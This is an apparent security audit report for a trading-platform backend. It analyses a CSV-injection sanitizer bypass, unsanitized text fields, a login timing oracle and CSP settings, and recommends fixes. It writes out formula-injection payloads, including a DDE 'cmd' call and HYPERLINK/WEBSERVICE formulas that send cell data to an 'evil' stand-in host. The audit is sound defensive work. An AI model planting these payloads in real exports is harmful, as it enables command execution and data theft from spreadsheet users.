# Persona 37 — CSV / Injection Attack Surface Audit

**Target:** `_sanitize_user_text` (Wave 35, `backend/api/routes/trades.py:144`) plus every free-text surface an attacker can post through.
**Production:** https://tradingalpha.net (admin-only singleton account). Not exercised live — probed for headers + 429 only.
**Method:** Static read of every `@router.post`/`.put`/Pydantic model under `backend/api/routes/`, plus isolated unit tests of the sanitizer with adversarial inputs. No malicious traffic sent to prod.

## Findings (10 max)

### F1 — `_sanitize_user_text` CSV-injection bypass via leading whitespace [CRITICAL]
**File:** `backend/api/routes/trades.py:166-172`
The function strips C0 controls (keeping `\n`, `\t`), THEN checks `cleaned[0] in "=+-@"`, THEN `.strip()`s. Order is wrong — when the input begins with a whitespace char that survives the first pass (`\t`, `\n`, or a plain space `0x20`), `cleaned[0]` is the whitespace, the formula-prefix check is skipped, and `.strip()` at the end peels the whitespace away, leaving the raw `=cmd|/c calc!A1` in the persisted notes / strategy field. Verified:
- `' =cmd|/c calc!A1'` → `'=cmd|/c calc!A1'` (no leading quote)
- `'\t=HYPERLINK("http://evil/"&A1,"click")'` → `'=HYPERLINK(...)'` (data-exfil payload preserved)
- `'\n=WEBSERVICE("http://evil/"&A1)'` → `'=WEBSERVICE(...)'`

So the answer to the question in the prompt: **no — Wave 35 does not actually block `=cmd|/c calc!A1`**; the canonical no-whitespace form is quoted, but a single leading space/tab/newline defeats it. The frontend CSV writer (`frontend/src/app/(dashboard)/settings/page.tsx:253-266`) quotes for `,` and `"` only, so the un-quoted `=` reaches Excel unchanged.

### F2 — Sanitizer never checks Unicode formula-prefix homoglyphs [HIGH]
Same function. The allow/deny test is `cleaned[0] in "=+-@"` — ASCII only. Excel treats fullwidth `＝` (U+FF1D) identically to `=` in many locales and via `ALT-X` expansion. Input `'＝cmd|/c calc'` passes through unchanged. Same for the SOFT HYPHEN (U+00AD) being invisibly prepended.

### F3 — Sanitizer preserves BOM / RTL-override / DEL at position 0 [MEDIUM]
`chr(0x7F)` (DEL) has `ord >= 0x20` and passes the filter. `\uFEFF` (BOM) and `\u202E` (RTL override) are `>= 0x20` too. All three are invisible in a terminal/note viewer but let a payload hide `=cmd` at visual-position-0 to a reviewer eyeballing the raw ledger before the CSV export.

### F4 — CSV-injection defense is applied to exactly two fields [HIGH]
`_sanitize_user_text` is wired only to `CreateOrderRequest.notes` and `CreateOrderRequest.strategy` (`backend/api/routes/trades.py:181-193`). It is **not** applied to:
- `CreatePresetRequest.name` (`backend/api/routes/screener.py:128`) — stored in PG `screener_presets.name String(100)` unique, but the preset list is rendered in the screener UI and nothing prevents `=cmd|/c calc!A1` from landing there if that list ever gets CSV-exported.
- `ChatRequest.message` / `ChatRequest.context` (`backend/api/routes/agents.py:26`) — persisted in conversation history cache and could be echoed into a downstream CSV.
- `TradingViewAlert.message` / `.strategy` (`backend/api/routes/webhooks.py:31-33`) — the attacker controls these whenever the webhook secret is exposed, and `_handle_info_alert`/`_handle_trade_signal` propagate the string into Redis `alerts` channel → UI toast → user copy-paste vectors.
- Frontend journal notes (`TradePanel.tsx:980` `JOURNAL_NOTES_KEY`) live only in `localStorage` but the tax/trade CSV exports pull `t.strategy` directly from the server trade_ledger — same bypass in F1 lands there.

### F5 — Login username-enumeration timing oracle [HIGH]
`backend/api/routes/auth.py:312-316`. Short-circuit `or` evaluation: if `submitted_username != settings.ADMIN_USERNAME`, Python never calls `verify_password(...)`. bcrypt costs ~100-300ms; a string-compare is ~microseconds. A remote attacker can distinguish "valid admin username, wrong password" from "wrong username" by response latency alone, within the 5-failure/5-min cap. Fix: always execute `verify_password` against a constant dummy hash when the username doesn't match.

### F6 — `LoginRequest.username`/`password` unbounded [MEDIUM]
`backend/api/routes/auth.py:283-285` has no `Field(..., max_length=...)`. FastAPI will accept a megabyte-scale password field and pass it to bcrypt (which truncates at 72 bytes but still processes the full JSON payload). Combined with F5 this is an amplification vector — 5 shots per window, each can be a large-ish body.

### F7 — Notes `Field(max_length=1000)` vs sanitizer cap 500 [LOW]
`backend/api/routes/trades.py:179` advertises `max_length=1000`, `_sanitize_user_text` silently truncates to 500. A client that relies on the declared contract and sends 501-1000 chars will get quietly truncated without any 422. Pick one bound and enforce it in one place.

### F8 — Tab-character left intact enables CSV column-break injection [MEDIUM]
The filter keeps `\t`. Excel's TSV import (`Data → From Text`) treats `\t` as a column separator. `'value\tDROP TABLE users'` in notes won't trigger the `=+-@` quote path, survives sanitization, and — when a user pastes the exported cell into a TSV-aware workflow — breaks the row structure. The sanitizer comment claims `\t` is "legitimately emitted in a notes textarea"; I don't see a UI that produces tabs in the notes field (all textareas default to `tab = focus next field`), so the allowlist is wider than required.

### F9 — No SQL / NoSQL / LDAP / XXE surface present [INFO — good]
Confirmed negative findings:
- All DB access is SQLAlchemy ORM or `text("...WHERE col = :bind")` with allowlisted column names (e.g. `trade_ledger.py:720,761`). No string-concatenated SQL reaches the DB.
- No MongoDB, no `pymongo`/`motor`, no `ldap3`, no `xml.etree`/`lxml`/`xmltodict` imports anywhere in the backend. The only "Mongo" hit is the `MDB` ticker in the symbol list (`symbols.py:87`). XXE is not a vector because no XML parsers are on the input path.
- Webhook payload is JSON-only (`webhooks.py:66`); signed with HMAC and `hmac.compare_digest`.

### F10 — CSP allows `script-src 'self' 'unsafe-inline'` [LOW]
From `curl -I https://tradingalpha.net/`. `unsafe-inline` on script-src defeats most modern XSS mitigations. No XSS sinks were found in the frontend (`dangerouslySetInnerHTML` / `.innerHTML =` grep = 0 matches), so this is defense-in-depth only, but worth tightening to a nonce/hash-based CSP when possible.

## 250-word summary

Wave 35's `_sanitize_user_text` does **not** block `=cmd|/c calc!A1` reliably. The function quotes the canonical form (verified), but its check-then-strip ordering is exploitable: any leading whitespace that survives the C0 filter — a plain space, a `\t`, or an `\n` — hides the `=` from the prefix-membership test, and the trailing `.strip()` peels the whitespace back off, persisting the raw formula. A Hetzner-hosted analyst who opens the CSV export (`settings/page.tsx`, tax or trade reports) in Excel would detonate `HYPERLINK`, `WEBSERVICE`, or DDE payloads. The frontend CSV writer escapes only commas and quotes, so the server-side sanitizer is the sole control.

Scope of the defense is also narrower than the audit scope: only `CreateOrderRequest.notes` and `.strategy` run through the sanitizer. Screener preset names, agent chat messages, TradingView webhook `.message`/`.strategy`, and the frontend's localStorage journal are all untouched, even though all of them converge into UI or downstream CSVs.

Unicode homoglyphs (`＝` U+FF1D), BOM, RTL-override, and `\x7F` are not normalized; the allowlist is ASCII-only.

Login-side: bcrypt is timing-safe, rate-limiting is real (429 at `/api/v1/auth/login` after 5 tries), HSTS/X-Frame-Options/nosniff headers are set, and there is a genuine lockout counter. But `login` short-circuits `verify_password` when the username doesn't match — a username-enumeration timing oracle on the singleton admin account — and `LoginRequest` has no field-length caps.

SQL, NoSQL, LDAP, XXE: no injectable surface exists. All DB paths use parameter-bound SQLAlchemy; no Mongo / LDAP / XML parsers are imported anywhere in the backend.

**Top priority:** reorder `_sanitize_user_text` (strip first, prefix-check second) and widen the sanitizer to every user-text field in one Pydantic validator.
